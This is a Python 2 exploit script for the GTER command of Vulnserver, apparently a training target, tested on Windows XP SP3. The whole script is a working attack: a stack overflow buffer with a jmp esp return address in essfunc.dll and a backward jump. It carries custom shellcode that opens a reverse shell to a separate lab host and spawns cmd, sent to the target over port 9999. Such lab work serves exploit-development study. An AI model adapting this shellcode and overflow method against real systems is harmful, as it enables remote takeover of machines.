# Exploit for Vulnserver - GTER - Custom Reverse Shell
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

cmd   = "GTER /.:/"

Align_stack = "\x50\x5c" # PUSH EAX # POP ESP

Custom_rev_shell = "\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\xbb\x6a\x8b\xab\x71\xff\xd3\x96\x68\xc0\xa8\x88\x80\x66\x68\x23\x29\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x16\x52\x56\xbb\x07\x4a\xab\x71\xff\xd3\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1\x83\xec\x10\x89\xe3\x56\x56\x56\x31\xd2\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xbb\x6b\x23\x80\x7c\xff\xd3"

junk1 = "A" * (147-len(Align_stack+Custom_rev_shell)) 
eip   = "\xaf\x11\x50\x62"       # 0x625011af : jmp esp in essfunc.dll
jmp   = "\xe9\x64\xff\xff\xff"  
junk2 = "C" * (5000-len(cmd+junk1+eip+jmp))

buffer = cmd + Align_stack + Custom_rev_shell + junk1 + eip + jmp + junk2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.136.129", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
